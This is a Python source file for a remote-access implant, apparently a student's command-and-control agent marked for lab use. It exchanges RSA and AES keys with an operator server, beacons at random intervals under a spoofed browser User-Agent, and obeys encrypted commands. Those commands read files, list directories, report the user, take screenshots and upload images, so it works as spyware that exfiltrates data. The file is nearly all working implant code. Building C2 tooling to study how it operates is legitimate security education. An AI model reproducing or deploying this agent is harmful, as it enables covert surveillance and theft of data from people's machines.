import os,time ,base64,pyautogui,requests,threading,socket,getpass,uuid,hashlib,sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "shared"))
# ---- end path bootstrap ----
from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG
from loguru import logger
import OPERATIONS,PROTOCOLS,encryptions
import argparse,random
from log_setup import setup_logging

BASE_URL= None

def parse_args():
    p = argparse.ArgumentParser(description="HTTP agent (educational,lab use only(")
    p.add_argument("--host", default="127.0.0.1", help="Server IP")
    p.add_argument("--port", type=int, required=True, help="Server port")
    return p.parse_args()

# ---- end imports ----
#encrypt the aes with the server's public key, and sent it to the server - encrypted
aes_key = encryptions.aes_key_creation()
logger.info(f"Successfully created AES key")
#turn it to int version for RSA exchange
int_aes_key = int.from_bytes(aes_key, byteorder='little')
public_key = 0
N = 0

agent_data = {"agent_id": "" ,"N": "", "public_key": "", "is_encrypted": "False", "ip_adress":"",'aes_key':f'{str(int_aes_key)}'  }

def generate_agent_id():
    hostname = socket.gethostname()
    username = getpass.getuser()
    mac_address = str(uuid.getnode())  # מחזיר את כתובת ה-MAC כמספר שלם
    raw_fingerprint = f"{hostname}-{username}-{mac_address}"
    agent_hash = hashlib.sha256(raw_fingerprint.encode('utf-8')).hexdigest()
    return agent_hash[:16]

def decrypt_data_by_server(msg:str, iv:str , aes_key:int):
    """
    :param msg(str): recieve at base64 code
    :param iv(str): recieve at base64 code
    :param aes_key(int): recieve at int (which represent bytes - need to convert)
    :return:
    """
    #input for decryption function should be bytes:
    decoded64_msg = (encryptions.base_64_decoder(msg))
    decoded64_iv = (encryptions.base_64_decoder(iv))

    len_aes_key = (aes_key.bit_length()+7//8)
    bytes_aes_key = (aes_key.to_bytes(16 , 'little'))
    decrypted_msg_by_server = encryptions.aes_decryption(decoded64_msg,bytes_aes_key,decoded64_iv)
    unpaded_decrypted_msg_by_server = encryptions.aes_unpadder(decrypted_msg_by_server)

    #check for image data magic number starting
    if unpaded_decrypted_msg_by_server.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return  unpaded_decrypted_msg_by_server
    #if not image - text ,which decoded in utf-8
    else:
        return  unpaded_decrypted_msg_by_server.decode('utf-8')

def encrypt_data_by_server(msg:str,aes_key:int)->bytes:
    iv = encryptions.iv_creator()
    if isinstance(msg,str):
        massage_ived = msg.encode("utf-8")
    else:
        massage_ived = msg
    bytes_aes_key = (aes_key.to_bytes(16, 'little'))
    padded_msg = encryptions.aes_padder(massage_ived)
    msg_encrypted = encryptions.aes_encryption(padded_msg, bytes_aes_key, iv)
    return msg_encrypted, iv

def cmd_cat(aes_key,args):
    logger.info("client has asked for 'cat' command")
    cwd = os.getcwd()
    final_url = os.path.abspath(f"{cwd}/{os.path.basename(args[0])}")
    logger.info(f"the last url is {final_url} that the customer asked is: ")
    try:
        with open(final_url, "r") as f:
            content = f.read()
            encrypted_content, iv = encrypt_data_by_server(content, aes_key)
            return encrypted_content, iv
    except FileNotFoundError:
        msg = "file not found"
        encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
        return encrypted_content, iv

def cmd_whoami(aes_key,args):
    logger.info("client has asked for 'whoami' command")
    user = OPERATIONS.whoami()
    aes_key = int(agent_data['aes_key'])
    encrypted_content, iv = encrypt_data_by_server(user, aes_key)
    return encrypted_content,iv

def cmd_dir(aes_key,args):
    logger.info("client has asked for 'dir' command")
    cwd = os.getcwd()
    files = os.listdir(cwd)
    str_listed = ",".join(files)
    encrypted_content,iv  = encrypt_data_by_server(str_listed, aes_key)
    return encrypted_content,iv

def cmd_screenshot(aes_key, args):
    pyautogui.screenshot(str(SCREENSHOT))
    msg = "screenshot successfuly"
    encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
    return encrypted_content, iv

def cmd_send_img(aes_key, args):
    try:
        URL_PIC = str(SCREENSHOT)
        with open(URL_PIC, 'rb') as f:
            img_data = f.read()
            logger.info("the img_data has loaded successfuly")
            encrypted_content, iv = encrypt_data_by_server(img_data, aes_key)
            return  encrypted_content, iv
    except FileNotFoundError:
        msg = "no image. please use SCREENSHOT before"
        encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
        return  encrypted_content, iv

COMMAND_HANDLERS = {
    "cat":        cmd_cat ,
    "dir":        cmd_dir ,
    "whoami":     cmd_whoami,
    "SCREENSHOT": cmd_screenshot,
    "SEND_IMG": cmd_send_img
}

def command_handler():
    while True:
        if agent_data['is_encrypted'] == 'True':
            time.sleep(random.randrange(1, 10))
            #becon - agent ask server for a command
            server_response = ask_for_commands()
            logger.info(server_response)
            #ask_for_commands return a strings which is actually base64 decode
            msg= server_response['msg']
            iv = server_response['iv']
            decrypted_server_response = decrypt_data_by_server(msg,iv,int(agent_data['aes_key']))
            #--------------------------------------
            logger.info(decrypted_server_response)
            if decrypted_server_response:
                #here i have to decrypt p
                if decrypted_server_response == "nothing":
                    logger.info("no command by server")
                else:
                    aes_key = int(agent_data['aes_key'])
                command, *args = decrypted_server_response.split()
                handler = COMMAND_HANDLERS.get(command)
                if handler:
                    try:
                        encrypted_content, iv = handler(aes_key,args)
                        response = send_data_to_server(encrypted_content, iv)
                        logger.info(response)
                    except Exception as e:
                        logger.error(f"handler for '{command}' failed: {e}")
                        encrypted_content, iv = encrypt_data_by_server("Alert: command failed", aes_key)
                        response = send_data_to_server(encrypted_content, iv)
                        logger.info(response)
            else:
                #might be not useful - to delete!
                logger.info("no avilable command")


#the target of the function is to send a GET commands to the server
#and ask for the public key, and N - its just return the response - no encryption included.
def ask_for_keys():
    try:
        custom_headers = {
            "Agent-ID": f"{generate_agent_id()}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        response = requests.get(f'{BASE_URL}getkeys',headers=custom_headers)
    except requests.exceptions.ConnectionError:
        logger.info("Connection Error")
        return "Connection Error"
    if response.status_code == 200:
        logger.info("Success!")
        logger.info(response.text)
        return response.json()


def ask_for_commands():
            try:
                custom_headers = {
                    "Agent-ID": f"{generate_agent_id()}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                }
                response = requests.get(f'{BASE_URL}getcommands', headers=custom_headers)
            except requests.exceptions.ConnectionError:
                return "Connection Error"

            if response.status_code == 200:
                logger.info("Success!")
                logger.info(response.json())
                return response.json()
            else:
                logger.info("problem at encryption - please check!")

def send_data_to_server(data_to_send,iv):
    try:
        custom_headers = {
            "Agent-ID": f"{generate_agent_id()}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        int_iv = int.from_bytes(iv,byteorder='little')
        base64_content = base64.b64encode(data_to_send).decode('utf-8')
        data =({"content": base64_content,"iv": str(int_iv)})
        response = requests.post(f'{BASE_URL}getcommands',json=data,headers=custom_headers)

    except requests.exceptions.ConnectionError:
        logger.info("Connection Error")
    if response.status_code == 200:
        logger.info("Success!")
        logger.info(response.text)
        return response.text



def get_encryption_data():
    while agent_data['is_encrypted'] == 'False':
        logger.info(f"encryption status is : {agent_data['is_encrypted']}")
        logger.info("ask for data")
        data = ask_for_keys()
        logger.info(f"the json response is {data}")
        time.sleep(1)
        if data:
            agent_data['public_key'] = int(data["public_key"])
            agent_data['N'] = int(data["N"])

def check_encryption_status():
    while True:
        time.sleep(10)
        logger.info("check if encryption is good")
        if  agent_data['N'] and agent_data['public_key'] :
            logger.info("the encryption is good")
            x=send_hash_to_server()
            if x['msg'] == 'success':
                agent_data['is_encrypted'] = 'True'
                logger.info("the aes key got by server successfully!")
                logger.info("the encryption is fine")
            break
        else:
            logger.info("the encryption is not good")
            agent_data['is_encrypted'] = 'False'

#this function made the AES key exchange with server
def send_hash_to_server():
    aes_encrypted_key = encryptions.encrypt_with_public_key(int(agent_data['public_key']),int(agent_data['N']), int_aes_key)
    try:
        custom_headers = {
            "Agent-ID": f"{generate_agent_id()}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        data =({"aes_key_int": str(aes_encrypted_key),})
        response = requests.post(f'{BASE_URL}getkeys',json=data,headers=custom_headers)

    except requests.exceptions.ConnectionError:
        logger.info("Connection Error")
    if response.status_code == 200:
        logger.info("Success!")
        logger.info(response.text)
        return response.json()
def main():
    global BASE_URL
    setup_logging()
    args = parse_args()
    BASE_URL = f"http://{args.host}:{args.port}/"

    t1 = threading.Thread(target= get_encryption_data, args=())
    t2 = threading.Thread(target= check_encryption_status, args=())
    t3= threading.Thread(target=command_handler , args=())
    t2.start()
    t1.start()
    t2.join()
    t1.join()
    t3.start()

if __name__ == "__main__":
    main()

